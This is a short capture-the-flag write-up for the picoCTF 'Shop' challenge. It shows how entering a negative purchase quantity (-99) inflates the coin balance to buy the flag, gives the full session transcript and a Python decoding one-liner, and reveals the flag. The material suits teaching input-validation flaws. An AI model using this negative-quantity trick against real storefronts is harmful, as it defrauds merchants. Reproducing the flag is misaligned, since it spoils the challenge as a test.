# Shop

## Problem

> Best Stuff - Cheap Stuff, Buy Buy Buy... Store Instance: source. The shop is open for business at `nc mercury.picoctf.net 42159`.

* [Program](./source)

## Solution

1. Choose an option to buy, and buy a large negative amount of them so the program gives them to you instead of you paying for them.

2. Then, buy 1 fruitful flag to have the program print the flag.

3. The complete program input and output is as follows:

    ```
    Welcome to the market!
    =====================
    You have 40 coins
        Item		Price	Count
    (0) Quiet Quiches	10	12
    (1) Average Apple	15	8
    (2) Fruitful Flag	100	1
    (3) Sell an Item
    (4) Exit
    Choose an option: 
    0
    How many do you want to buy?
    -99
    You have 1030 coins
        Item		Price	Count
    (0) Quiet Quiches	10	111
    (1) Average Apple	15	8
    (2) Fruitful Flag	100	1
    (3) Sell an Item
    (4) Exit
    Choose an option: 
    2
    How many do you want to buy?
    1
    Flag is:  [112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 55 57 55 98 50 57 50 99 125]
    ```

2. We can decode this from decimal to ascii using Python like so `python -c 'print("".join([chr(x) for x in [112, 105, 99, 111, 67, 84, 70, 123, 98, 52, 100, 95, 98, 114, 111, 103, 114, 97, 109, 109, 101, 114, 95, 55, 57, 55, 98, 50, 57, 50, 99, 125]]))'` to get the flag.

### Flag

`picoCTF{b4d_brogrammer_797b292c}`
